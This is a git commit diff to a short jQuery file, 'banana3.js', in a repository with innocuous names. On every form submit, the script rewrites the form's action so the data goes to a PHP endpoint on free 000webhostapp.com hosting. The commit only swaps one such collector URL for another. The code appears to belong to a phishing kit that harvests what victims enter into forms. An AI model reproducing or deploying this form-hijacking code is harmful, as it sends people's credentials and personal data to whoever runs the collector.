f4351c1dc812d2e0d9fb9c0cd8291fe74661d846
lapekbugih-bolulubo <149999335+lapekbugih-bolulubo@users.noreply.github.com>
2023-11-06 13:57:22 +0700

    Update banana3.js

--- jonsbo/cupboard/banana3.js
+++ jonsbo/cupboard/banana3.js
@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://ninja-empat-tak-duaribuduatiga.000webhostapp.com/tousand/juri.php");
+  $(myform).attr("action", "https://newyears-duaribuduaempat-go.000webhostapp.com/reguler/juri.php");
 });
